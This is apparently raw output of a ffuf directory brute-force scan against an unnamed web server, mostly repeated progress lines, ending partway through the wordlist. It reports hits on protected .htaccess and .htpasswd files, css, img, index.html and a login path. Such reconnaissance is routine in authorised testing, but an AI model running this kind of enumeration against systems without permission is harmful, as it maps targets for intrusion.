:: Progress: [1/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:01] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:01] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:01] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:01] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:01] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:01] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:01] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:01] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:02] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:02] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:02] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:02] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:02] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:02] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:02] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:02] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:03] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:03] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:03] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:03] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:03] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:03] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:03] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:03] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:04] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:04] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:04] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:04] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:04] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:04] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:04] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:04] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:05] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:05] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:05] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:05] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:05] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:05] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:05] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:05] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:06] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:06] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:06] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:06] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:06] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:06] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:06] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:06] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:07] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:07] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:07] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:07] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:07] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:07] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:07] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:07] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:08] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:08] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:08] :: Er:: Progress: [40/9228] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:08] :: Er[Status: 200, Size: 7606, Words: 2329, Lines: 141, Duration: 8442ms]
    * FUZZ: 

:: Progress: [45/9228] :: Job [1/1] :: 200 req/sec :: Duration: [0:00:08] :: :: Progress: [46/9228] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:08] :: :: Progress: [59/9228] :: Job [1/1] :: 108 req/sec :: Duration: [0:00:08] :: [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 8600ms]
    * FUZZ: .htpasswd.html FFUFHASH : cdfe14 

:: Progress: [60/9228] :: Job [1/1] :: 109 req/sec :: Duration: [0:00:08] :: :: Progress: [72/9228] :: Job [1/1] :: 113 req/sec :: Duration: [0:00:08] :: :: Progress: [87/9228] :: Job [1/1] :: 109 req/sec :: Duration: [0:00:08] :: :: Progress: [106/9228] :: Job [1/1] :: 121 req/sec :: Duration: [0:00:09] :::: Progress: [122/9228] :: Job [1/1] :: 118 req/sec :: Duration: [0:00:09] :::: Progress: [140/9228] :: Job [1/1] :: 123 req/sec :: Duration: [0:00:09] :::: Progress: [157/9228] :: Job [1/1] :: 124 req/sec :: Duration: [0:00:09] :::: Progress: [175/9228] :: Job [1/1] :: 126 req/sec :: Duration: [0:00:09] :::: Progress: [194/9228] :: Job [1/1] :: 129 req/sec :: Duration: [0:00:09] :::: Progress: [213/9228] :: Job [1/1] :: 131 req/sec :: Duration: [0:00:09] :::: Progress: [239/9228] :: Job [1/1] :: 138 req/sec :: Duration: [0:00:09] :::: Progress: [243/9228] :: Job [1/1] :: 136 req/sec :: Duration: [0:00:09] ::[Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 9902ms]
    * FUZZ: .htaccess

:: Progress: [259/9228] :: Job [1/1] :: 144 req/sec :: Duration: [0:00:10] ::[Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 89ms]
    * FUZZ: .html FFUFHASH : cdfe14 

:: Progress: [271/9228] :: Job [1/1] :: 151 req/sec :: Duration: [0:00:10] ::[Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 82ms]
    * FUZZ: .htpasswd

:: Progress: [272/9228] :: Job [1/1] :: 153 req/sec :: Duration: [0:00:10] :::: Progress: [273/9228] :: Job [1/1] :: 153 req/sec :: Duration: [0:00:10] ::[Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 82ms]
    * FUZZ: .hta

:: Progress: [276/9228] :: Job [1/1] :: 153 req/sec :: Duration: [0:00:10] ::[Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 78ms]
    * FUZZ: .hta.html FFUFHASH : cdfe14 

:: Progress: [279/9228] :: Job [1/1] :: 153 req/sec :: Duration: [0:00:10] ::[Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 87ms]
    * FUZZ: .htaccess.html FFUFHASH : cdfe14 

:: Progress: [286/9228] :: Job [1/1] :: 158 req/sec :: Duration: [0:00:10] :::: Progress: [309/9228] :: Job [1/1] :: 162 req/sec :: Duration: [0:00:10] :::: Progress: [336/9228] :: Job [1/1] :: 172 req/sec :: Duration: [0:00:10] :::: Progress: [360/9228] :: Job [1/1] :: 179 req/sec :: Duration: [0:00:10] :::: Progress: [384/9228] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:10] :::: Progress: [407/9228] :: Job [1/1] :: 190 req/sec :: Duration: [0:00:10] :::: Progress: [434/9228] :: Job [1/1] :: 195 req/sec :: Duration: [0:00:10] :::: Progress: [456/9228] :: Job [1/1] :: 189 req/sec :: Duration: [0:00:11] :::: Progress: [480/9228] :: Job [1/1] :: 192 req/sec :: Duration: [0:00:11] :::: Progress: [501/9228] :: Job [1/1] :: 191 req/sec :: Duration: [0:00:11] :::: Progress: [527/9228] :: Job [1/1] :: 191 req/sec :: Duration: [0:00:11] :::: Progress: [551/9228] :: Job [1/1] :: 189 req/sec :: Duration: [0:00:11] :::: Progress: [572/9228] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:11] :::: Progress: [597/9228] :: Job [1/1] :: 191 req/sec :: Duration: [0:00:11] :::: Progress: [621/9228] :: Job [1/1] :: 189 req/sec :: Duration: [0:00:11] :::: Progress: [645/9228] :: Job [1/1] :: 189 req/sec :: Duration: [0:00:12] :::: Progress: [670/9228] :: Job [1/1] :: 191 req/sec :: Duration: [0:00:12] :::: Progress: [691/9228] :: Job [1/1] :: 191 req/sec :: Duration: [0:00:12] :::: Progress: [719/9228] :: Job [1/1] :: 191 req/sec :: Duration: [0:00:12] :::: Progress: [736/9228] :: Job [1/1] :: 192 req/sec :: Duration: [0:00:12] :::: Progress: [766/9228] :: Job [1/1] :: 182 req/sec :: Duration: [0:00:12] :::: Progress: [795/9228] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:12] :::: Progress: [813/9228] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:13] :::: Progress: [837/9228] :: Job [1/1] :: 182 req/sec :: Duration: [0:00:13] :::: Progress: [860/9228] :: Job [1/1] :: 183 req/sec :: Duration: [0:00:13] :::: Progress: [883/9228] :: Job [1/1] :: 180 req/sec :: Duration: [0:00:13] :::: Progress: [907/9228] :: Job [1/1] :: 183 req/sec :: Duration: [0:00:13] :::: Progress: [931/9228] :: Job [1/1] :: 181 req/sec :: Duration: [0:00:13] :::: Progress: [954/9228] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:13] :::: Progress: [979/9228] :: Job [1/1] :: 183 req/sec :: Duration: [0:00:13] :::: Progress: [1002/9228] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:14] ::: Progress: [1027/9228] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:14] ::: Progress: [1050/9228] :: Job [1/1] :: 191 req/sec :: Duration: [0:00:14] ::: Progress: [1075/9228] :: Job [1/1] :: 191 req/sec :: Duration: [0:00:14] ::: Progress: [1099/9228] :: Job [1/1] :: 196 req/sec :: Duration: [0:00:14] ::: Progress: [1122/9228] :: Job [1/1] :: 191 req/sec :: Duration: [0:00:14] ::: Progress: [1149/9228] :: Job [1/1] :: 196 req/sec :: Duration: [0:00:14] ::: Progress: [1168/9228] :: Job [1/1] :: 196 req/sec :: Duration: [0:00:14] ::: Progress: [1197/9228] :: Job [1/1] :: 195 req/sec :: Duration: [0:00:15] ::: Progress: [1219/9228] :: Job [1/1] :: 194 req/sec :: Duration: [0:00:15] ::: Progress: [1244/9228] :: Job [1/1] :: 193 req/sec :: Duration: [0:00:15] ::: Progress: [1268/9228] :: Job [1/1] :: 195 req/sec :: Duration: [0:00:15] ::: Progress: [1292/9228] :: Job [1/1] :: 194 req/sec :: Duration: [0:00:15] ::: Progress: [1316/9228] :: Job [1/1] :: 193 req/sec :: Duration: [0:00:15] ::: Progress: [1340/9228] :: Job [1/1] :: 196 req/sec :: Duration: [0:00:15] ::: Progress: [1365/9228] :: Job [1/1] :: 192 req/sec :: Duration: [0:00:15] ::: Progress: [1389/9228] :: Job [1/1] :: 194 req/sec :: Duration: [0:00:16] ::: Progress: [1414/9228] :: Job [1/1] :: 194 req/sec :: Duration: [0:00:16] ::: Progress: [1437/9228] :: Job [1/1] :: 195 req/sec :: Duration: [0:00:16] ::: Progress: [1461/9228] :: Job [1/1] :: 193 req/sec :: Duration: [0:00:16] ::: Progress: [1483/9228] :: Job [1/1] :: 191 req/sec :: Duration: [0:00:16] ::: Progress: [1499/9228] :: Job [1/1] :: 184 req/sec :: Duration: [0:00:16] ::: Progress: [1520/9228] :: Job [1/1] :: 183 req/sec :: Duration: [0:00:16] ::: Progress: [1538/9228] :: Job [1/1] :: 178 req/sec :: Duration: [0:00:16] ::: Progress: [1554/9228] :: Job [1/1] :: 170 req/sec :: Duration: [0:00:17] ::: Progress: [1567/9228] :: Job [1/1] :: 161 req/sec :: Duration: [0:00:17] ::: Progress: [1580/9228] :: Job [1/1] :: 154 req/sec :: Duration: [0:00:17] ::: Progress: [1600/9228] :: Job [1/1] :: 151 req/sec :: Duration: [0:00:17] ::: Progress: [1617/9228] :: Job [1/1] :: 147 req/sec :: Duration: [0:00:17] ::: Progress: [1637/9228] :: Job [1/1] :: 146 req/sec :: Duration: [0:00:17] ::: Progress: [1658/9228] :: Job [1/1] :: 145 req/sec :: Duration: [0:00:17] ::: Progress: [1684/9228] :: Job [1/1] :: 148 req/sec :: Duration: [0:00:17] ::: Progress: [1705/9228] :: Job [1/1] :: 149 req/sec :: Duration: [0:00:18] ::: Progress: [1732/9228] :: Job [1/1] :: 154 req/sec :: Duration: [0:00:18] ::: Progress: [1757/9228] :: Job [1/1] :: 162 req/sec :: Duration: [0:00:18] ::: Progress: [1785/9228] :: Job [1/1] :: 182 req/sec :: Duration: [0:00:18] ::: Progress: [1815/9228] :: Job [1/1] :: 198 req/sec :: Duration: [0:00:18] ::: Progress: [1846/9228] :: Job [1/1] :: 211 req/sec :: Duration: [0:00:18] ::: Progress: [1873/9228] :: Job [1/1] :: 220 req/sec :: Duration: [0:00:18] ::: Progress: [1903/9228] :: Job [1/1] :: 225 req/sec :: Duration: [0:00:18] ::: Progress: [1936/9228] :: Job [1/1] :: 236 req/sec :: Duration: [0:00:19] ::: Progress: [1969/9228] :: Job [1/1] :: 247 req/sec :: Duration: [0:00:19] ::: Progress: [2003/9228] :: Job [1/1] :: 251 req/sec :: Duration: [0:00:19] ::: Progress: [2036/9228] :: Job [1/1] :: 255 req/sec :: Duration: [0:00:19] ::: Progress: [2071/9228] :: Job [1/1] :: 265 req/sec :: Duration: [0:00:19] ::: Progress: [2108/9228] :: Job [1/1] :: 277 req/sec :: Duration: [0:00:19] ::: Progress: [2143/9228] :: Job [1/1] :: 276 req/sec :: Duration: [0:00:19] ::: Progress: [2179/9228] :: Job [1/1] :: 283 req/sec :: Duration: [0:00:19] ::: Progress: [2215/9228] :: Job [1/1] :: 286 req/sec :: Duration: [0:00:20] ::: Progress: [2249/9228] :: Job [1/1] :: 292 req/sec :: Duration: [0:00:20] ::: Progress: [2249/9228] :: Job [1/1] :: 292 req/sec :: Duration: [0:00:20] :[Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 79ms]
    * FUZZ: css

:: Progress: [2286/9228] :: Job [1/1] :: 289 req/sec :: Duration: [0:00:20] ::: Progress: [2322/9228] :: Job [1/1] :: 293 req/sec :: Duration: [0:00:20] ::: Progress: [2355/9228] :: Job [1/1] :: 284 req/sec :: Duration: [0:00:20] ::: Progress: [2394/9228] :: Job [1/1] :: 291 req/sec :: Duration: [0:00:20] ::: Progress: [2430/9228] :: Job [1/1] :: 288 req/sec :: Duration: [0:00:20] ::: Progress: [2463/9228] :: Job [1/1] :: 286 req/sec :: Duration: [0:00:20] ::: Progress: [2501/9228] :: Job [1/1] :: 293 req/sec :: Duration: [0:00:21] ::: Progress: [2534/9228] :: Job [1/1] :: 284 req/sec :: Duration: [0:00:21] ::: Progress: [2572/9228] :: Job [1/1] :: 294 req/sec :: Duration: [0:00:21] ::: Progress: [2605/9228] :: Job [1/1] :: 284 req/sec :: Duration: [0:00:21] ::: Progress: [2646/9228] :: Job [1/1] :: 294 req/sec :: Duration: [0:00:21] ::: Progress: [2679/9228] :: Job [1/1] :: 284 req/sec :: Duration: [0:00:21] ::: Progress: [2718/9228] :: Job [1/1] :: 290 req/sec :: Duration: [0:00:21] ::: Progress: [2749/9228] :: Job [1/1] :: 281 req/sec :: Duration: [0:00:21] ::: Progress: [2791/9228] :: Job [1/1] :: 292 req/sec :: Duration: [0:00:22] ::: Progress: [2821/9228] :: Job [1/1] :: 284 req/sec :: Duration: [0:00:22] ::: Progress: [2860/9228] :: Job [1/1] :: 288 req/sec :: Duration: [0:00:22] ::: Progress: [2894/9228] :: Job [1/1] :: 285 req/sec :: Duration: [0:00:22] ::: Progress: [2932/9228] :: Job [1/1] :: 290 req/sec :: Duration: [0:00:22] ::: Progress: [2964/9228] :: Job [1/1] :: 280 req/sec :: Duration: [0:00:22] ::: Progress: [3004/9228] :: Job [1/1] :: 289 req/sec :: Duration: [0:00:22] ::: Progress: [3037/9228] :: Job [1/1] :: 282 req/sec :: Duration: [0:00:22] ::: Progress: [3073/9228] :: Job [1/1] :: 291 req/sec :: Duration: [0:00:23] ::: Progress: [3109/9228] :: Job [1/1] :: 286 req/sec :: Duration: [0:00:23] ::: Progress: [3145/9228] :: Job [1/1] :: 287 req/sec :: Duration: [0:00:23] ::: Progress: [3180/9228] :: Job [1/1] :: 287 req/sec :: Duration: [0:00:23] ::: Progress: [3218/9228] :: Job [1/1] :: 289 req/sec :: Duration: [0:00:23] ::: Progress: [3250/9228] :: Job [1/1] :: 285 req/sec :: Duration: [0:00:23] ::: Progress: [3290/9228] :: Job [1/1] :: 287 req/sec :: Duration: [0:00:23] ::: Progress: [3323/9228] :: Job [1/1] :: 289 req/sec :: Duration: [0:00:23] ::: Progress: [3358/9228] :: Job [1/1] :: 287 req/sec :: Duration: [0:00:24] ::: Progress: [3395/9228] :: Job [1/1] :: 289 req/sec :: Duration: [0:00:24] ::: Progress: [3430/9228] :: Job [1/1] :: 286 req/sec :: Duration: [0:00:24] ::: Progress: [3466/9228] :: Job [1/1] :: 282 req/sec :: Duration: [0:00:24] ::: Progress: [3501/9228] :: Job [1/1] :: 286 req/sec :: Duration: [0:00:24] ::: Progress: [3537/9228] :: Job [1/1] :: 287 req/sec :: Duration: [0:00:24] ::: Progress: [3571/9228] :: Job [1/1] :: 285 req/sec :: Duration: [0:00:24] ::: Progress: [3608/9228] :: Job [1/1] :: 289 req/sec :: Duration: [0:00:24] ::: Progress: [3637/9228] :: Job [1/1] :: 277 req/sec :: Duration: [0:00:25] ::: Progress: [3673/9228] :: Job [1/1] :: 276 req/sec :: Duration: [0:00:25] ::: Progress: [3706/9228] :: Job [1/1] :: 272 req/sec :: Duration: [0:00:25] ::: Progress: [3743/9228] :: Job [1/1] :: 274 req/sec :: Duration: [0:00:25] ::: Progress: [3782/9228] :: Job [1/1] :: 275 req/sec :: Duration: [0:00:25] ::: Progress: [3820/9228] :: Job [1/1] :: 286 req/sec :: Duration: [0:00:25] ::: Progress: [3856/9228] :: Job [1/1] :: 298 req/sec :: Duration: [0:00:25] ::: Progress: [3889/9228] :: Job [1/1] :: 290 req/sec :: Duration: [0:00:25] ::: Progress: [3924/9228] :: Job [1/1] :: 291 req/sec :: Duration: [0:00:26] ::: Progress: [3958/9228] :: Job [1/1] :: 286 req/sec :: Duration: [0:00:26] ::: Progress: [3991/9228] :: Job [1/1] :: 278 req/sec :: Duration: [0:00:26] ::: Progress: [4019/9228] :: Job [1/1] :: 274 req/sec :: Duration: [0:00:26] :[Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 92ms]
    * FUZZ: img

:: Progress: [4024/9228] :: Job [1/1] :: 278 req/sec :: Duration: [0:00:26] ::: Progress: [4058/9228] :: Job [1/1] :: 268 req/sec :: Duration: [0:00:26] :[Status: 200, Size: 7606, Words: 2329, Lines: 141, Duration: 98ms]
    * FUZZ: index.html

:: Progress: [4065/9228] :: Job [1/1] :: 275 req/sec :: Duration: [0:00:26] ::: Progress: [4093/9228] :: Job [1/1] :: 274 req/sec :: Duration: [0:00:26] ::: Progress: [4127/9228] :: Job [1/1] :: 272 req/sec :: Duration: [0:00:26] ::: Progress: [4159/9228] :: Job [1/1] :: 269 req/sec :: Duration: [0:00:26] ::: Progress: [4191/9228] :: Job [1/1] :: 268 req/sec :: Duration: [0:00:27] ::: Progress: [4227/9228] :: Job [1/1] :: 274 req/sec :: Duration: [0:00:27] ::: Progress: [4254/9228] :: Job [1/1] :: 261 req/sec :: Duration: [0:00:27] ::: Progress: [4276/9228] :: Job [1/1] :: 252 req/sec :: Duration: [0:00:27] ::: Progress: [4301/9228] :: Job [1/1] :: 239 req/sec :: Duration: [0:00:27] ::: Progress: [4322/9228] :: Job [1/1] :: 225 req/sec :: Duration: [0:00:27] ::: Progress: [4348/9228] :: Job [1/1] :: 217 req/sec :: Duration: [0:00:27] ::: Progress: [4374/9228] :: Job [1/1] :: 214 req/sec :: Duration: [0:00:27] ::: Progress: [4399/9228] :: Job [1/1] :: 203 req/sec :: Duration: [0:00:28] ::: Progress: [4426/9228] :: Job [1/1] :: 199 req/sec :: Duration: [0:00:28] ::: Progress: [4447/9228] :: Job [1/1] :: 192 req/sec :: Duration: [0:00:28] ::: Progress: [4471/9228] :: Job [1/1] :: 193 req/sec :: Duration: [0:00:28] ::: Progress: [4493/9228] :: Job [1/1] :: 195 req/sec :: Duration: [0:00:28] ::: Progress: [4514/9228] :: Job [1/1] :: 190 req/sec :: Duration: [0:00:28] ::: Progress: [4533/9228] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:28] ::: Progress: [4557/9228] :: Job [1/1] :: 182 req/sec :: Duration: [0:00:28] ::: Progress: [4574/9228] :: Job [1/1] :: 179 req/sec :: Duration: [0:00:29] ::: Progress: [4594/9228] :: Job [1/1] :: 173 req/sec :: Duration: [0:00:29] ::: Progress: [4616/9228] :: Job [1/1] :: 170 req/sec :: Duration: [0:00:29] ::: Progress: [4633/9228] :: Job [1/1] :: 168 req/sec :: Duration: [0:00:29] ::: Progress: [4654/9228] :: Job [1/1] :: 164 req/sec :: Duration: [0:00:29] ::: Progress: [4671/9228] :: Job [1/1] :: 163 req/sec :: Duration: [0:00:29] ::: Progress: [4693/9228] :: Job [1/1] :: 160 req/sec :: Duration: [0:00:29] ::: Progress: [4703/9228] :: Job [1/1] :: 158 req/sec :: Duration: [0:00:29] :[Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 80ms]
    * FUZZ: login

:: Progress: [4711/9228] :: Job [1/1] :: 159 req/sec :: Duration: [0:00:29] ::: Progress: [4730/9228] :: Job [1/1] :: 159 req/sec :: Duration: [0:00:30] ::: Progress: [4748/9228] :: Job [1/1] :: 155 req/sec :: Duration: [0:00:30] ::: Progress: [4769/9228] :: Job [1/1] :: 155 req/sec :: Duration: [0:00:30] ::: Progress: [4786/9228] :: Job [1/1] :: 152 req/sec :: Duration: [0:00:30] ::: Progress: [4806/9228] :: Job [1/1] :: 153 req/sec :: Duration: [0:00:30] ::: Progress: [4826/9228] :: Job [1/1] :: 153 req/sec :: Duration: [0:00:30] ::: Progress: [4845/9228] :: Job [1/1] :: 153 req/sec :: Duration: [0:00:30] ::: Progress: [4863/9228] :: Job [1/1] :: 152 req/sec :: Duration: [0:00:30] ::: Progress: [4883/9228] :: Job [1/1] :: 153 req/sec :: Duration: [0:00:31] ::: Progress: [4902/9228] :: Job [1/1] :: 153 req/sec :: Duration: [0:00:31] ::: Progress: [4920/9228] :: Job [1/1] :: 154 req/sec :: Duration: [0:00:31] ::: Progress: [4938/9228] :: Job [1/1] :: 151 req/sec :: Duration: [0:00:31] ::: Progress: [4959/9228] :: Job [1/1] :: 155 req/sec :: Duration: [0:00:31] ::: Progress: [4977/9228] :: Job [1/1] :: 152 req/sec :: Duration: [0:00:31] ::: Progress: [4996/9228] :: Job [1/1] :: 153 req/sec :: Duration: [0:00:31] ::: Progress: [5016/9228] :: Job [1/1] :: 152 req/sec :: Duration: [0:00:31] ::: Progress: [5035/9228] :: Job [1/1] :: 154 req/sec :: Duration: [0:00:32] ::: Progress: [5053/9228] :: Job [1/1] :: 150 req/sec :: Duration: [0:00:32] ::: Progress: [5073/9228] :: Job [1/1] :: 153 req/sec :: Duration: [0:00:32] ::: Progress: [5091/9228] :: Job [1/1] :: 153 req/sec :: Duration: [0:00:32] ::: Progress: [5111/9228] :: Job [1/1] :: 154 req/sec :: Duration: [0:00:32] ::: Progress: [5130/9228] :: Job [1/1] :: 152 req/sec :: Duration: [0:00:32] ::: Progress: [5149/9228] :: Job [1/1] :: 152 req/sec :: Duration: [0:00:32] ::: Progress: [5170/9228] :: Job [1/1] :: 153 req/sec :: Duration: [0:00:32] ::: Progress: [5189/9228] :: Job [1/1] :: 154 req/sec :: Duration: [0:00:33] ::: Progress: [5204/9228] :: Job [1/1] :: 150 req/sec :: Duration: [0:00:33] ::: Progress: [5225/9228] :: Job [1/1] :: 152 req/sec :: Duration: [0:00:33] ::: Progress: [5240/9228] :: Job [1/1] :: 151 req/sec :: Duration: [0:00:33] ::: Progress: [5256/9228] :: Job [1/1] :: 147 req/sec :: Duration: [0:00:33] ::: Progress: [5272/9228] :: Job [1/1] :: 144 req/sec :: Duration: [0:00:33] ::: Progress: [5289/9228] :: Job [1/1] :: 144 req/sec :: Duration: [0:00:33] ::: Progress: [5303/9228] :: Job [1/1] :: 140 req/sec :: Duration: [0:00:33] ::: Progress: [5317/9228] :: Job [1/1] :: 138 req/sec :: Duration: [0:00:34] ::: Progress: [5331/9228] :: Job [1/1] :: 134 req/sec :: Duration: [0:00:34] ::: Progress: [5347/9228] :: Job [1/1] :: 132 req/sec :: Duration: [0:00:34] ::: Progress: [5359/9228] :: Job [1/1] :: 128 req/sec :: Duration: [0:00:34] ::: Progress: [5371/9228] :: Job [1/1] :: 125 req/sec :: Duration: [0:00:34] ::: Progress: [5383/9228] :: Job [1/1] :: 121 req/sec :: Duration: [0:00:34] ::: Progress: [5393/9228] :: Job [1/1] :: 118 req/sec :: Duration: [0:00:34] ::: Progress: [5401/9228] :: Job [1/1] :: 112 req/sec :: Duration: [0:00:34] ::: Progress: [5409/9228] :: Job [1/1] :: 110 req/sec :: Duration: [0:00:35] ::: Progress: [5417/9228] :: Job [1/1] :: 106 req/sec :: Duration: [0:00:35] ::: Progress: [5421/9228] :: Job [1/1] :: 102 req/sec :: Duration: [0:00:35] ::: Progress: [5425/9228] :: Job [1/1] :: 95 req/sec :: Duration: [0:00:35] :::: Progress: [5427/9228] :: Job [1/1] :: 92 req/sec :: Duration: [0:00:35] :::: Progress: [5431/9228] :: Job [1/1] :: 87 req/sec :: Duration: [0:00:35] :::: Progress: [5433/9228] :: Job [1/1] :: 84 req/sec :: Duration: [0:00:35] :::: Progress: [5437/9228] :: Job [1/1] :: 80 req/sec :: Duration: [0:00:35] :::: Progress: [5439/9228] :: Job [1/1] :: 78 req/sec :: Duration: [0:00:36] :::: Progress: [5439/9228] :: Job [1/1] :: 78 req/sec :: Duration: [0:00:36] :::: Progress: [5439/9228] :: Job [1/1] :: 78 req/sec :: Duration: [0:00:36] :::: Progress: [5439/9228] :: Job [1/1] :: 78 req/sec :: Duration: [0:00:36] :::: Progress: [5439/9228] :: Job [1/1] :: 78 req/sec :: Duration: [0:00:36] :::: Progress: [5439/9228] :: Job [1/1] :: 78 req/sec :: Duration: [0:00:36] :::: Progress: [5439/9228] :: Job [1/1] :: 78 req/sec :: Duration: [0:00:36] :::: Progress: [5439/9228] :: Job [1/1] :: 78 req/sec :: Duration: [0:00:36] :::: Progress: [5439/9228] :: Job [1/1] :: 78 req/sec :: Duration: [0:00:37] :::: Progress: [5439/9228] :: Job [1/1] :: 78 req/sec :: Duration: [0:00:37] :::: Progress: [5439/9228] :: Job [1/1] :: 78 req/sec :: Duration: [0:00:37] :::: Progress: [5439/9228] :: Job [1/1] :: 78 req/sec :: Duration: [0:00:37] :::: Progress: [5443/9228] :: Job [1/1] :: 49 req/sec :: Duration: [0:00:37] :::: Progress: [5448/9228] :: Job [1/1] :: 48 req/sec :: Duration: [0:00:37] :::: Progress: [5455/9228] :: Job [1/1] :: 47 req/sec :: Duration: [0:00:37] :::: Progress: [5464/9228] :: Job [1/1] :: 46 req/sec :: Duration: [0:00:37] :::: Progress: [5472/9228] :: Job [1/1] :: 45 req/sec :: Duration: [0:00:38] :::: Progress: [5482/9228] :: Job [1/1] :: 45 req/sec :: 